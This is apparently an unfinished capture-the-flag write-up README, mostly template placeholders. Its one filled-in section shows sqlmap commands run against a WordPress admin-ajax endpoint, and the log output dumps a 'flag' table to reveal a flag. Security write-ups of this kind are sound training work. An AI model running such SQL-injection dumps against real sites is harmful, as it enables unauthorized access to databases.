# HackSAG

Brief description here of the challenge

## FLAG{ALWAYS_CHECK_COMMITS}

![imagen del commit donde hemos encontrado el flag](./images/FLAG{ALWAYS_CHECK_COMMITS}_1.jpg?raw=true)

Describe here the process to find the flag (you can include videos, images, etc)

## FLAG{Update_Plugins!}

python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --tables

[20:04:16] [INFO] fetching number of tables for database 'flag'
[20:04:16] [INFO] retrieved: 1
[20:04:18] [INFO] retrieved: flag

python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --dump -D flag -T flag

[20:20:00] [INFO] fetching entries for table 'flag' in database 'flag'
[20:20:00] [INFO] fetching number of entries for table 'flag' in database 'flag'
[20:20:00] [INFO] retrieved: 1
[20:20:04] [INFO] retrieved: FLAG{Update_Plugins!}

## FLAG_NAME_2

Describe here the process to find the flag (you can include videos, images, etc)

## FLAG_NAME_N

Describe here the process to find the flag (you can include videos, images, etc)

